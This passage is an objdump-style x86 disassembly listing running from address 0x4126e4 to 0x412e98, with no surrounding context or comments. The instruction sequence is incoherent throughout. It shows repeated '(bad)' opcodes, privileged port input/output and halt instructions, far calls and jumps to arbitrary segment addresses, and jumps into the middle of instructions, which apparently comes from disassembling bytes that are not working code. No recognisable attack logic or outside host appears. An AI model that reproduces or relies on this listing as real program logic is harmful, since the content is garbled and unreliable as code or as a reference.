  4126e4:	adc    cl,BYTE PTR [ebx+0x73652aba]
  4126ea:	cdq    
  4126eb:	inc    edx
  4126ec:	fisub  WORD PTR [ecx+0xc]
  4126ef:	add    al,al
  4126f1:	adc    DWORD PTR [edx],0xe4aeebf6
  4126f7:	and    DWORD PTR [ebp-0x659661a2],0x35
  4126fe:	fwait
  4126ff:	dec    ebp
  412700:	addr16 hlt 
  412702:	push   ds
  412703:	push   ecx
  412704:	dec    esp
  412706:	(bad)  
  412707:	in     al,dx
  412708:	pop    esp
  412709:	push   esp
  41270a:	pop    ebx
  41270b:	pop    esi
  41270c:	cli    
  41270d:	retf   0x9fea
  412710:	enter  0x4a65,0xf3
  412714:	(bad)  
  412716:	loop   0x412756
  412718:	stc    
  412719:	into   
  41271a:	mov    eax,ds:0xc85fb992
  41271f:	mov    ds:0xd41bb661,eax
  412724:	les    cx,DWORD PTR [ebp+0x50]
  412728:	ja     0x41279c
  41272a:	sub    BYTE PTR [esp+eiz*2],al
  41272d:	adc    dl,BYTE PTR [edi+0x24]
  412730:	call   0x8f61:0xf1747433
  412737:	mov    bl,0xfc
  412739:	mov    ds:0x183041f9,eax
  41273e:	lahf   
  41273f:	outs   dx,DWORD PTR ds:[esi]
  412740:	push   esi
  412741:	hlt    
  412742:	push   ecx
  412743:	(bad)  
  412744:	mov    bl,0x39
  412746:	cmp    ch,BYTE PTR [edx-0x4f]
  412749:	push   0xffffffa7
  41274b:	xor    edi,ebp
  41274d:	es sahf 
  41274f:	shr    DWORD PTR [eax+0xb37d846],1
  412755:	pop    ebp
  412756:	scas   eax,DWORD PTR es:[edi]
  412757:	jp     0x4127a9
  412759:	retf   0xa301
  41275c:	cwde   
  41275d:	aad    0xe1
  41275f:	jp     0x4127a3
  412761:	ss inc edi
  412763:	xor    eax,DWORD PTR [esi]
  412765:	in     eax,dx
  412766:	mov    fs,WORD PTR [eax+eiz*1-0x76]
  41276a:	push   esi
  41276b:	inc    DWORD PTR [edi]
  41276d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41276e:	cdq    
  41276f:	cmp    ebx,esi
  412771:	dec    ecx
  412772:	call   0x63a1:0x9697edf
  412779:	mov    esi,0xcb1d97a2
  41277e:	mov    dl,0xcf
  412780:	mov    ecx,0x6044abbc
  412785:	inc    ebp
  412786:	cld    
  412787:	inc    esi
  412788:	sbb    ah,BYTE PTR [esi-0x5ee7739b]
  41278e:	inc    ebx
  41278f:	xchg   DWORD PTR [esi+edi*4+0x52],edi
  412793:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412794:	xor    ebp,ecx
  412796:	mov    ecx,eax
  412798:	mov    ebx,0xd4d33b36
  41279d:	cli    
  41279e:	lods   al,BYTE PTR ds:[esi]
  41279f:	cmp    eax,0x7e77f035
  4127a4:	push   cs
  4127a5:	imul   esp,DWORD PTR [eax-0x3a],0x1e
  4127a9:	aaa    
  4127aa:	gs dec ebx
  4127ac:	fwait
  4127ad:	repz dec ebp
  4127af:	mov    al,ds:0xa4c125db
  4127b4:	jmp    0x985e8c56
  4127b9:	mov    ss,WORD PTR [ecx-0x9]
  4127bc:	push   ss
  4127bd:	push   ecx
  4127be:	ja     0x412743
  4127c0:	xchg   esp,eax
  4127c1:	pop    ds
  4127c2:	cmp    DWORD PTR [esi-0x4f],edi
  4127c5:	or     DWORD PTR [esi-0x4b199ae4],eax
  4127cb:	dec    esp
  4127cc:	sbb    ah,BYTE PTR [esi+0x31]
  4127cf:	xchg   ebx,eax
  4127d0:	adc    BYTE PTR [ebp-0x1c],ch
  4127d3:	add    ecx,DWORD PTR [ecx]
  4127d5:	and    bl,ch
  4127d7:	cli    
  4127d8:	cmp    al,bh
  4127da:	xchg   ebp,eax
  4127db:	mov    edi,0x375bf104
  4127e0:	push   ebp
  4127e1:	add    al,0xfb
  4127e3:	dec    eax
  4127e4:	es mov cl,0x24
  4127e7:	pop    edx
  4127e8:	stc    
  4127e9:	mov    eax,ds:0x3917ef27
  4127ee:	jae    0x4127e6
  4127f0:	xor    al,0x1
  4127f2:	jmp    0x4fde:0x1c4179b5
  4127f9:	dec    edx
  4127fa:	je     0x41282a
  4127fc:	popa   
  4127fd:	mov    dh,0xe6
  4127ff:	sbb    al,0x17
  412802:	push   ss
  412803:	and    cl,BYTE PTR [edx]
  412805:	jge    0x412823
  412807:	sbb    ebx,DWORD PTR [ecx+0x4f]
  41280a:	fcmovnb st,st(0)
  41280c:	imul   esi,DWORD PTR [esi+edi*4-0x71],0x58
  412811:	xchg   ecx,eax
  412812:	nop
  412813:	or     al,BYTE PTR [edx+0x6]
  412816:	shr    dh,cl
  412818:	fstp   DWORD PTR [ebx-0x19]
  41281b:	out    dx,al
  41281c:	fcomp  DWORD PTR ds:0x8eefd01a
  412822:	inc    ebx
  412823:	nop
  412824:	scas   eax,DWORD PTR es:[edi]
  412825:	pop    ecx
  412826:	call   0xc7330d4
  41282b:	xchg   edi,eax
  41282c:	retf   0x4acc
  41282f:	in     al,0xf5
  412831:	ffreep st(3)
  412833:	ins    DWORD PTR es:[edi],dx
  412834:	imul   ebp,edx,0x8452e16e
  41283a:	sub    eax,edx
  41283c:	imul   BYTE PTR [edi+0x23]
  41283f:	jmp    0xea30:0x3cceef70
  412846:	stos   DWORD PTR es:[edi],eax
  412847:	cmp    al,0x99
  412849:	jecxz  0x412853
  41284b:	ja     0x412890
  41284d:	mov    dl,bh
  41284f:	out    0x7c,al
  412851:	add    edi,DWORD PTR [ecx-0x78]
  412854:	push   eax
  412855:	shr    BYTE PTR [eax],1
  412857:	xchg   edi,eax
  412858:	or     DWORD PTR [eax-0x28427826],edx
  41285e:	adc    DWORD PTR [ebx+0x63802497],0xf156c9c3
  412868:	stos   BYTE PTR es:[edi],al
  412869:	jl     0x412855
  41286b:	pop    esp
  41286c:	ror    DWORD PTR gs:[edx+0x74fe05a0],0x63
  412874:	aas    
  412875:	ror    BYTE PTR [edi-0x2d],1
  412878:	push   edx
  412879:	and    dh,bh
  41287b:	ror    BYTE PTR [esi+0xa],0x3a
  41287f:	mov    ebx,DWORD PTR [esi]
  412881:	dec    ebx
  412882:	pop    edx
  412883:	addr16 ret 
  412885:	mov    bh,0x89
  412887:	xchg   ebx,eax
  412888:	xor    bl,ah
  41288a:	and    BYTE PTR [edx+0x6c8d0e24],0xcb
  412891:	cld    
  412892:	mov    es,edx
  412894:	cmc    
  412895:	xchg   esi,eax
  412896:	xor    edi,0xdf93149d
  41289c:	div    DWORD PTR [eax-0xe]
  41289f:	in     al,dx
  4128a0:	(bad)  
  4128a1:	sbb    BYTE PTR ds:0x3e3feb9a,ch
  4128a7:	mov    esi,0x16685bfa
  4128ac:	mov    al,ds:0xdb21d26e
  4128b1:	mov    dh,0x4a
  4128b3:	xor    DWORD PTR [eax],edi
  4128b5:	mov    ebx,0xfa8986fd
  4128ba:	pop    esp
  4128bb:	mov    fs,WORD PTR [ebx]
  4128bd:	clc    
  4128be:	adc    ecx,DWORD PTR [esi]
  4128c0:	ds out 0xd5,al
  4128c3:	jmp    0x981a29d5
  4128c8:	adc    edi,edi
  4128ca:	data16 je 0x4128fc
  4128cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128ce:	mov    ebx,0x13a9afd7
  4128d3:	out    dx,eax
  4128d4:	add    ah,bh
  4128d6:	mov    al,0xbc
  4128d8:	xor    BYTE PTR [edx+ebx*8+0x48],bl
  4128dc:	or     DWORD PTR [eax-0x21],ebx
  4128df:	sub    dl,BYTE PTR [eax+0x534f0471]
  4128e5:	pushf  
  4128e6:	js     0x4128ce
  4128e8:	pop    esi
  4128e9:	mov    ds:0x31451b65,eax
  4128ee:	dec    ebx
  4128ef:	aam    0xe5
  4128f1:	push   edx
  4128f2:	adc    dh,BYTE PTR [ebx+ebx*1-0x2d5a0535]
  4128f9:	ins    DWORD PTR es:[edi],dx
  4128fa:	cmp    al,0x3d
  4128fc:	stc    
  4128fd:	mov    bh,0x9e
  4128ff:	xchg   ebx,eax
  412900:	dec    ebp
  412901:	test   BYTE PTR cs:[edi-0x13cacce4],0x9
  412909:	sub    al,0xfb
  41290b:	cmp    DWORD PTR [ecx-0x27],0x9dfb5ff9
  412912:	xchg   BYTE PTR [ebx],ch
  412914:	and    BYTE PTR [ebx-0x278ecb74],dl
  41291a:	jecxz  0x41293b
  41291c:	jae    0x4128aa
  41291e:	or     eax,0x1bd0cc04
  412923:	pop    edi
  412924:	push   cs
  412925:	mov    ah,0x5
  412927:	ret    
  412928:	(bad)  
  412929:	xor    eax,0x99a961b1
  41292e:	mov    ds:0x4f1cd650,eax
  412933:	sbb    bl,ch
  412935:	xchg   ecx,eax
  412936:	inc    esi
  412937:	aaa    
  412938:	push   0x7c
  41293a:	xor    dh,BYTE PTR [esp+eiz*2]
  41293d:	cli    
  41293e:	int    0xb4
  412940:	inc    ebx
  412941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412942:	xchg   edx,eax
  412943:	ja     0x4128cd
  412945:	rcl    DWORD PTR [eax],cl
  412947:	popa   
  412948:	es mov esp,0xa196e30f
  41294e:	pusha  
  41294f:	clc    
  412950:	mov    bl,0x2d
  412952:	ins    DWORD PTR es:[edi],dx
  412953:	out    dx,al
  412954:	mov    edi,DWORD PTR [edi+0x3b0f6624]
  41295a:	push   0xffffffd7
  41295c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41295d:	pop    esp
  41295e:	(bad)  
  41295f:	pop    ds
  412960:	add    eax,0xaa38498f
  412965:	test   al,0x87
  412967:	(bad)  
  412968:	out    dx,al
  412969:	mov    ecx,0xdeb53b4c
  41296e:	jmp    0xc7fc:0xa6fb2296
  412975:	mov    al,BYTE PTR [ebx+0x1f]
  412978:	xlat   BYTE PTR ds:[ebx]
  412979:	jo     0x4129b1
  41297b:	nop
  41297c:	cmp    BYTE PTR [esi+0xf366c9d],ch
  412982:	cld    
  412983:	or     eax,0xa22afa96
  412988:	mov    DWORD PTR [edx],ebx
  41298a:	or     ah,bh
  41298c:	in     eax,dx
  41298d:	enter  0x125e,0xca
  412991:	xor    al,0x5e
  412993:	sbb    DWORD PTR [esi+esi*4+0x3c04d865],ebp
  41299a:	addr16 iret 
  41299c:	sbb    eax,0x4c272da5
  4129a1:	xor    ah,BYTE PTR [edi-0x404fe785]
  4129a7:	sbb    bl,0xa
  4129aa:	mov    DWORD PTR [edx+edi*8+0x56],esp
  4129ae:	sti    
  4129af:	sub    ebp,DWORD PTR [esi+esi*8+0x32f9b095]
  4129b6:	out    dx,eax
  4129b7:	fist   DWORD PTR [bx+si]
  4129ba:	push   DWORD PTR [edx+0x56]
  4129bd:	dec    esp
  4129be:	mov    bh,0x3
  4129c0:	lahf   
  4129c1:	jg     0x4129b3
  4129c3:	or     ah,BYTE PTR [eax]
  4129c5:	jae    0x4129a9
  4129c7:	enter  0x17d1,0xfc
  4129cb:	data16 fistp DWORD PTR [ecx-0x5d]
  4129d0:	sbb    DWORD PTR [eax+0x40dc4f60],edi
  4129d6:	fdivr  DWORD PTR [esi+0x581beb19]
  4129dc:	push   ebx
  4129dd:	push   ebp
  4129de:	in     eax,0xcb
  4129e0:	call   0x4bf60874
  4129e5:	lock scas eax,DWORD PTR es:[edi]
  4129e7:	mov    ah,0x1e
  4129e9:	mov    eax,ds:0x2fe6a882
  4129ee:	adc    eax,0x7c8ecac7
  4129f3:	push   ebp
  4129f4:	lds    edx,FWORD PTR [edi+ecx*2-0x21]
  4129f8:	sub    eax,0x7c28db0c
  4129fd:	xchg   ebx,eax
  4129fe:	jbe    0x412a5a
  412a00:	mov    al,ds:0x41f8a231
  412a05:	iret   
  412a06:	out    0xda,al
  412a08:	out    0x82,eax
  412a0a:	cmp    eax,0xda67bc99
  412a0f:	pop    ecx
  412a10:	mov    dh,0xae
  412a12:	out    0xbf,eax
  412a14:	cld    
  412a15:	push   eax
  412a16:	(bad)  
  412a17:	loopne 0x412a5a
  412a19:	push   ecx
  412a1a:	jecxz  0x412a56
  412a1c:	mov    es,WORD PTR [eax]
  412a1e:	hlt    
  412a1f:	int3   
  412a20:	mov    ds:0xf68c36c7,eax
  412a25:	leave  
  412a26:	sar    DWORD PTR [edi+0x6972fb1c],cl
  412a2c:	cmp    al,0x5d
  412a2e:	jmp    0x9587ea98
  412a33:	(bad)
  412a37:	loop   0x412a93
  412a39:	sbb    DWORD PTR [edx+0x3d],ebp
  412a3c:	pop    ds
  412a3d:	dec    edx
  412a3e:	xchg   esp,eax
  412a3f:	into   
  412a40:	cmp    al,0x27
  412a42:	push   0xffffff83
  412a44:	inc    ebx
  412a45:	(bad)  
  412a46:	fdivp  st(3),st
  412a48:	cmp    al,0xcd
  412a4a:	(bad)  
  412a4c:	sti    
  412a4d:	or     BYTE PTR [edx-0x2152683b],bh
  412a53:	xlat   BYTE PTR ds:[ebx]
  412a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a55:	scas   al,BYTE PTR es:[edi]
  412a56:	rcl    dh,cl
  412a58:	and    BYTE PTR [ebp+0x268a0902],0x3
  412a5f:	fs jg  0x412a01
  412a62:	cld    
  412a63:	cmc    
  412a64:	push   ss
  412a65:	push   es
  412a66:	mov    ah,0xb4
  412a68:	fisttp DWORD PTR ss:[ebx+0x7]
  412a6c:	jo     0x412a8f
  412a6e:	sbb    ah,bh
  412a70:	pop    edx
  412a71:	dec    ebx
  412a72:	neg    DWORD PTR [edx]
  412a74:	lahf   
  412a75:	sbb    BYTE PTR ds:0x955f1bf8,0x28
  412a7c:	hlt    
  412a7d:	mov    bh,BYTE PTR [ebx-0x77]
  412a80:	shl    DWORD PTR [edi+0x16],cl
  412a83:	loop   0x412a71
  412a85:	sbb    edi,esi
  412a87:	mov    cl,bh
  412a89:	ret    
  412a8a:	sub    eax,0x82239ac0
  412a8f:	pushf  
  412a90:	call   0xe810:0xd4631e9
  412a97:	or     edx,DWORD PTR [edx-0x613dc23d]
  412a9d:	and    BYTE PTR [ebp-0xe73a559],dh
  412aa3:	in     eax,0xfa
  412aa5:	cmp    BYTE PTR [ebx],0xc0
  412aa8:	add    eax,0x22c490db
  412aad:	loopne 0x412a84
  412aaf:	pusha  
  412ab0:	inc    ebx
  412ab1:	jle    0x412ae9
  412ab3:	jne    0x412aeb
  412ab5:	fnsave [eax+0x6a]
  412ab8:	inc    esi
  412ab9:	inc    esi
  412aba:	ficom  WORD PTR [ebx+0x54d2e8bc]
  412ac0:	bswap  eax
  412ac2:	xor    DWORD PTR [edx],esi
  412ac4:	ja     0x412b19
  412ac6:	and    dl,BYTE PTR [eax+ecx*8]
  412ac9:	in     eax,0x16
  412acb:	mov    cl,0x6d
  412acd:	add    DWORD PTR [eax-0x3c7cd966],esi
  412ad3:	fwait
  412ad4:	ins    DWORD PTR es:[edi],dx
  412ad5:	out    0x4c,al
  412ad7:	push   esp
  412ad8:	clc    
  412ad9:	(bad)  
  412ada:	mov    edx,0x37da3f92
  412adf:	inc    eax
  412ae0:	call   0xc9083f61
  412ae5:	mov    edi,0x428e8d8e
  412aea:	into   
  412aeb:	mov    DWORD PTR [eax+0x29af6dd7],esi
  412af1:	imul   esp,DWORD PTR [esi-0xe],0xffffffb7
  412af5:	out    dx,eax
  412af6:	cmp    al,0x2a
  412af8:	das    
  412af9:	rol    BYTE PTR [esi],1
  412afb:	neg    BYTE PTR [ebp+0x33]
  412afe:	loope  0x412b5b
  412b00:	push   eax
  412b01:	jb     0x412b77
  412b03:	sub    eax,0x8bd9c8e8
  412b08:	mov    ds:0xe2febd24,eax
  412b0d:	dec    esp
  412b0e:	jg     0x412b01
  412b10:	mov    esi,0xe713b22c
  412b15:	mov    ah,0xce
  412b17:	mov    esp,0xf7ee5f1e
  412b1c:	scas   eax,DWORD PTR es:[edi]
  412b1d:	add    edx,0x5d70fe36
  412b23:	pop    eax
  412b24:	sti    
  412b25:	sub    edx,edx
  412b27:	mov    ah,0x52
  412b29:	inc    edx
  412b2a:	fcmovbe st,st(4)
  412b2c:	mov    edi,0x28580d86
  412b31:	mov    bh,0x5f
  412b33:	xor    ebx,DWORD PTR [ecx]
  412b35:	mov    ebx,0xed355146
  412b3a:	dec    edi
  412b3b:	ja     0x412b74
  412b3d:	fucomip st,st(0)
  412b3f:	sti    
  412b40:	gs test ch,0x1f
  412b44:	in     al,0x56
  412b46:	mov    ch,0x3e
  412b48:	out    dx,eax
  412b49:	data16 sahf 
  412b4b:	add    cl,BYTE PTR [esp+edi*4-0xe4547e8]
  412b52:	push   ebx
  412b53:	loope  0x412b7b
  412b55:	adc    BYTE PTR [ecx-0x5c],cl
  412b58:	in     al,dx
  412b59:	cmc    
  412b5a:	jno    0x412b75
  412b5c:	jge    0x412bcd
  412b5e:	and    DWORD PTR [ecx+0x8dbf3b7],esi
  412b64:	(bad)  
  412b65:	ins    DWORD PTR es:[edi],dx
  412b66:	pop    ebp
  412b67:	js     0x412b45
  412b69:	nop
  412b6a:	(bad)  
  412b6b:	shl    dl,cl
  412b6d:	rcl    BYTE PTR [edi+0x4cb846c7],1
  412b73:	jmp    0xaec2:0x7e8acf7
  412b7a:	cmp    ah,BYTE PTR [edi+0x16f67fe4]
  412b80:	arpl   WORD PTR cs:[ecx],bx
  412b83:	pop    edx
  412b84:	test   al,0x9d
  412b86:	mov    edi,0xe136b527
  412b8b:	xor    esp,ebp
  412b8d:	add    eax,0x2528a2c1
  412b92:	loope  0x412b73
  412b94:	cld    
  412b95:	sbb    eax,0xbf2089cb
  412b9a:	sub    al,0x12
  412b9c:	inc    esi
  412b9d:	(bad)  
  412b9e:	xchg   ebx,eax
  412b9f:	pop    edx
  412ba0:	xchg   cx,ax
  412ba2:	sub    esi,DWORD PTR [eax]
  412ba4:	test   BYTE PTR [edx],ah
  412ba6:	mov    ebx,DWORD PTR [esi]
  412ba8:	iret   
  412ba9:	xchg   edi,eax
  412baa:	mov    ebx,0xfa9f1b48
  412baf:	or     BYTE PTR ds:0xca3f111c,ch
  412bb5:	pop    ecx
  412bb6:	mov    ds:0x13f74987,al
  412bbb:	xchg   ebx,eax
  412bbc:	pushf  
  412bbd:	inc    ebp
  412bbe:	sahf   
  412bbf:	ret    
  412bc0:	dec    esi
  412bc1:	mov    ?,WORD PTR [esi]
  412bc3:	arpl   WORD PTR [esi-0x3932b3ad],di
  412bc9:	jp     0x412b6c
  412bcb:	lea    ebx,[eax+esi*2]
  412bce:	adc    DWORD PTR [edi+0x7c],esp
  412bd1:	dec    esp
  412bd2:	mov    al,0x4f
  412bd4:	push   eax
  412bd5:	dec    ecx
  412bd6:	mov    al,ds:0x26ef2e57
  412bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bdc:	xor    DWORD PTR [ebp+0x39],eax
  412bdf:	xor    eax,0x988e5bf4
  412be4:	ins    DWORD PTR es:[edi],dx
  412be5:	inc    eax
  412be6:	aad    0xb5
  412be8:	nop
  412be9:	mov    ecx,0x64db5042
  412bee:	xchg   esp,eax
  412bef:	mov    esp,0x7779b055
  412bf4:	cmp    al,0x97
  412bf6:	sbb    al,0xa7
  412bf8:	das    
  412bf9:	out    0x77,eax
  412bfb:	mov    esi,0x4c90435f
  412c00:	add    ah,BYTE PTR [edx+ebp*4]
  412c03:	cmp    edi,DWORD PTR [esi+0x268becb]
  412c09:	jl     0x412c26
  412c0b:	cli    
  412c0c:	(bad)
  412c0f:	sar    DWORD PTR [esi+0x55],0xb8
  412c13:	pop    ds
  412c14:	fwait
  412c15:	fwait
  412c16:	jl     0x412bf9
  412c18:	pop    esp
  412c19:	pop    ds
  412c1a:	xor    BYTE PTR [edx-0xbef426a],bh
  412c20:	repnz in al,0x9c
  412c23:	xor    esp,0x8e3f9a2a
  412c29:	repz mov cl,0x22
  412c2c:	and    BYTE PTR [ecx],dl
  412c2e:	sub    DWORD PTR [eax+0x47],ecx
  412c31:	in     al,0x7f
  412c33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c34:	stc    
  412c35:	jns    0x412c7f
  412c37:	out    dx,eax
  412c38:	push   ebp
  412c39:	loop   0x412c30
  412c3b:	out    0x2c,eax
  412c3d:	add    ch,BYTE PTR [edx-0x7256f42b]
  412c43:	mov    cl,cl
  412c45:	(bad)  
  412c46:	shr    BYTE PTR [esi],0x91
  412c49:	pop    ds
  412c4a:	fdiv   st(0),st
  412c4c:	pop    esi
  412c4d:	sub    BYTE PTR [ebx+0x7e],ch
  412c50:	(bad)  
  412c51:	dec    esp
  412c52:	lahf   
  412c53:	jbe    0x412c81
  412c55:	xchg   ebp,eax
  412c56:	add    cl,al
  412c58:	lock jno 0x412c8c
  412c5b:	sub    dl,BYTE PTR [eax-0x51d78e56]
  412c61:	sahf   
  412c62:	pop    eax
  412c63:	xchg   DWORD PTR [edi+0x44],edi
  412c66:	cld    
  412c67:	cs dec edx
  412c69:	lock sub al,0xb3
  412c6c:	out    dx,eax
  412c6d:	(bad)  
  412c6e:	aad    0x61
  412c70:	pop    edi
  412c71:	xchg   edx,eax
  412c72:	test   DWORD PTR [edi+edx*1-0x45],edi
  412c76:	popa   
  412c77:	push   0x60f8abdf
  412c7c:	mov    ecx,0xa09c73e6
  412c81:	mov    dl,0xd1
  412c83:	sti    
  412c84:	pop    esi
  412c85:	jecxz  0x412cd1
  412c87:	iret   
  412c88:	lods   eax,DWORD PTR ds:[esi]
  412c89:	adc    eax,0x5ee13132
  412c8e:	in     eax,0x93
  412c90:	das    
  412c91:	mov    cs,WORD PTR [edi-0xa4db1af]
  412c97:	push   0x274cd8e4
  412c9c:	jnp    0x412cd6
  412c9e:	lods   eax,DWORD PTR ds:[esi]
  412c9f:	dec    eax
  412ca0:	in     eax,0x45
  412ca2:	ss jge 0x412c62
  412ca5:	cmp    ebp,eax
  412ca7:	add    al,0xb7
  412ca9:	push   ds
  412caa:	test   al,0x9d
  412cac:	daa    
  412cad:	iret   
  412cae:	std    
  412caf:	and    ebp,ebx
  412cb1:	inc    esi
  412cb2:	loop   0x412cd3
  412cb4:	(bad)  
  412cb5:	mov    ebx,0x2e61dcdb
  412cba:	movaps xmm3,xmm5
  412cbd:	sbb    esp,DWORD PTR [eax-0x5a05a13e]
  412cc3:	xor    eax,edx
  412cc5:	stc    
  412cc6:	add    eax,0x954337df
  412ccb:	jbe    0x412d13
  412ccd:	or     al,0x48
  412ccf:	idiv   DWORD PTR [eax-0x3]
  412cd2:	add    ax,0x3c47
  412cd6:	(bad)  
  412cd8:	int3   
  412cd9:	dec    eax
  412cda:	call   0x3c27:0x1c9b51e
  412ce1:	pop    edi
  412ce2:	in     eax,0x69
  412ce4:	or     al,0x65
  412ce6:	mov    ebp,0x6a03a9ea
  412ceb:	cli    
  412cec:	xor    bl,BYTE PTR ds:0xc1d21cf
  412cf2:	mov    ecx,0xa2c9a2b2
  412cf7:	f2xm1  
  412cf9:	dec    ebx
  412cfa:	shl    dh,cl
  412cfc:	in     eax,0x7a
  412cfe:	dec    esi
  412cff:	push   eax
  412d00:	jl     0x412d23
  412d02:	fwait
  412d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d04:	loope  0x412d41
  412d06:	lock dec esp
  412d08:	mov    ah,0x73
  412d0a:	xlat   BYTE PTR ds:[ebx]
  412d0b:	in     al,dx
  412d0c:	cmp    BYTE PTR [esi+0x15],bh
  412d0f:	xchg   ecx,eax
  412d10:	jl     0x412d4c
  412d12:	xchg   ebx,eax
  412d13:	xchg   DWORD PTR [edx],esi
  412d15:	add    bh,BYTE PTR [edx+ebp*1-0x9]
  412d19:	stc    
  412d1a:	lods   eax,DWORD PTR ds:[esi]
  412d1b:	dec    esp
  412d1c:	cdq    
  412d1d:	ins    DWORD PTR es:[edi],dx
  412d1e:	xchg   ecx,eax
  412d1f:	lea    edx,[ecx+0x7e]
  412d22:	inc    DWORD PTR [eax+0x37]
  412d25:	fld1   
  412d27:	rol    DWORD PTR [esi-0x25],1
  412d2a:	xor    BYTE PTR [eax+0x1873ec2],cl
  412d30:	jp     0x412d54
  412d32:	push   eax
  412d33:	xlat   BYTE PTR ds:[ebx]
  412d34:	out    dx,al
  412d35:	inc    ebx
  412d36:	in     eax,0xb8
  412d38:	jle    0x412d34
  412d3a:	jmp    0x412d6f
  412d3c:	ficomp DWORD PTR [edx-0x2b]
  412d3f:	add    al,0x31
  412d41:	mov    ch,0xbd
  412d43:	fnstcw WORD PTR [ebp-0x7b]
  412d46:	scas   al,BYTE PTR es:[edi]
  412d47:	adc    al,0xf5
  412d49:	dec    ebp
  412d4a:	ror    BYTE PTR ds:0x81e7e846,1
  412d50:	fistp  DWORD PTR [ebx+eiz*1-0x34ba2f95]
  412d57:	int3   
  412d58:	mov    eax,0x2f1f7fa1
  412d5d:	int    0xf0
  412d5f:	aas    
  412d60:	ret    
  412d61:	jns    0x412d5b
  412d63:	call   0x9b1d:0xe42cecfb
  412d6a:	sbb    al,0x68
  412d6c:	sub    al,0x1e
  412d6e:	mov    ah,0xa8
  412d70:	rol    esi,0xd3
  412d73:	or     al,0x3f
  412d75:	xor    ch,al
  412d77:	cmp    esi,DWORD PTR [ebp+0x5f]
  412d7a:	xchg   ebx,eax
  412d7b:	or     DWORD PTR [edi-0x489cda6a],edx
  412d81:	push   0xb879e333
  412d86:	sbb    eax,0xf4fa0b9d
  412d8b:	push   esp
  412d8c:	adc    eax,0x693ca18b
  412d91:	ror    DWORD PTR [edi],0xca
  412d94:	aad    0x68
  412d96:	(bad)  
  412d97:	in     eax,dx
  412d98:	out    dx,al
  412d99:	retf   
  412d9a:	xchg   edi,eax
  412d9b:	cld    
  412d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d9d:	cmp    al,0x6e
  412d9f:	inc    ecx
  412da0:	mov    ah,0x51
  412da2:	xchg   ecx,eax
  412da3:	loope  0x412d61
  412da5:	and    al,0x49
  412da7:	int    0x49
  412da9:	xlat   BYTE PTR ds:[ebx]
  412daa:	cdq    
  412dab:	popf   
  412dac:	loopne 0x412d8f
  412dae:	jb     0x412d84
  412db0:	fistp  WORD PTR [ebx-0x3]
  412db3:	adc    eax,ebp
  412db5:	fwait
  412db6:	and    al,0xde
  412db8:	ss pop eax
  412dba:	out    0x62,eax
  412dbc:	stc    
  412dbd:	inc    ecx
  412dbe:	xchg   ebp,eax
  412dbf:	lods   al,BYTE PTR ds:[esi]
  412dc0:	mov    dh,0x98
  412dc2:	mov    ah,0x8c
  412dc4:	jle    0x412e40
  412dc6:	push   0xffffffef
  412dc8:	mov    ah,0xac
  412dca:	mov    ecx,0x7cf4086d
  412dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dd0:	cld    
  412dd1:	or     ah,bh
  412dd3:	ds aas 
  412dd5:	loope  0x412dac
  412dd7:	ss pop edx
  412dd9:	inc    edi
  412dda:	mov    al,0x92
  412ddc:	daa    
  412ddd:	sub    eax,0xc666150
  412de2:	out    dx,al
  412de3:	inc    esp
  412de4:	xor    DWORD PTR [ebx+0x7a],edi
  412de7:	add    bh,BYTE PTR [esp+eax*8-0x5]
  412deb:	mov    ds:0x413f3e5a,al
  412df0:	fs hlt 
  412df2:	lahf   
  412df3:	mov    ah,0xde
  412df5:	std    
  412df6:	add    eax,0xb543d28c
  412dfb:	jbe    0x412e64
  412dfd:	(bad)  
  412dfe:	adc    DWORD PTR [ebx],ebp
  412e00:	fnstenv [ebx+0x57]
  412e03:	jp     0x412de4
  412e05:	outs   dx,BYTE PTR ds:[esi]
  412e06:	and    BYTE PTR [ebp-0x147b7bd7],al
  412e0c:	xor    al,0x8
  412e0e:	imul   ecx,DWORD PTR [ebx-0x5c351e5e],0xffffffc3
  412e15:	xor    esi,DWORD PTR [edi+ebx*2-0x28]
  412e19:	jne    0x412e8f
  412e1b:	push   esp
  412e1c:	xchg   ebp,eax
  412e1d:	mov    dl,0x87
  412e1f:	pop    edi
  412e20:	xchg   edx,eax
  412e21:	pop    ebp
  412e22:	lods   eax,DWORD PTR ds:[esi]
  412e23:	push   edi
  412e24:	or     al,BYTE PTR [edi+0x18fe7811]
  412e2a:	dec    edi
  412e2b:	cwde   
  412e2c:	jl     0x412de8
  412e2e:	jl     0x412e9c
  412e30:	cwde   
  412e31:	pavgb  mm2,QWORD PTR [ebp-0x7d]
  412e35:	sbb    BYTE PTR [eax+0x8],ch
  412e38:	cld    
  412e39:	jbe    0x412ddf
  412e3b:	cmc    
  412e3c:	adc    BYTE PTR [ebx],ah
  412e3e:	jecxz  0x412ea5
  412e40:	sub    DWORD PTR [ebp-0x62f4084],ecx
  412e46:	push   edx
  412e47:	std    
  412e48:	clc    
  412e49:	les    esp,FWORD PTR [bx+di]
  412e4c:	xor    eax,0x3240e1cd
  412e51:	lods   eax,DWORD PTR ds:[esi]
  412e52:	jo     0x412e04
  412e54:	sbb    al,0xc2
  412e56:	ja     0x412e62
  412e58:	dec    ebp
  412e59:	mov    ds:0xdccc4e8,al
  412e5e:	sbb    eax,0x44a9a108
  412e63:	push   0xe9205f9f
  412e68:	arpl   sp,bp
  412e6a:	sub    eax,DWORD PTR [ebp-0x14]
  412e6d:	call   0x564c:0xb9ae3e28
  412e74:	xchg   esi,eax
  412e75:	lods   eax,DWORD PTR ds:[esi]
  412e76:	cmp    eax,0x1f0a0e3d
  412e7b:	call   0xddc4:0x492288d
  412e82:	xor    DWORD PTR [ecx],0x150a1cbe
  412e88:	jl     0x412e3a
  412e8a:	lahf   
  412e8b:	mov    WORD PTR [esi+esi*4],?
  412e8e:	(bad)  
  412e8f:	popa   
  412e90:	ret    0x535d
  412e93:	or     BYTE PTR [edx-0x11],bl
  412e96:	scas   eax,DWORD PTR es:[edi]
  412e97:	dec    esi
  412e98:	div    BYTE PTR [eax]
